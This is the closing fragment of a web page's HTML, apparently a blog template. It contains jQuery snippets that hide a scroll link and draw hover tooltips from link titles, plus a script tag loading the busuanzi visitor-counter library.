        if ($("#comments").length < 1) {
            $("#scroll > a:nth-child(2)").hide();
        };
    })
</script>

<script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js">
</script>

  <script language="javascript">
    $(function() {
        $("a[title]").each(function() {
            var a = $(this);
            var title = a.attr('title');
            if (title == undefined || title == "") return;
            a.data('title', title).removeAttr('title').hover(
            function() {
                var offset = a.offset();
                $("<div id=\"anchortitlecontainer\"></div>").appendTo($("body")).html(title).css({
                    top: offset.top - a.outerHeight() - 15,
                    left: offset.left + a.outerWidth()/2 + 1
                }).fadeIn(function() {
                    var pop = $(this);
                    setTimeout(function() {
                        pop.remove();
                    }, pop.text().length * 800);
                });
            }, function() {
                $("#anchortitlecontainer").remove();
            });
        });
    });
</script>


  </div>
</body>
</html>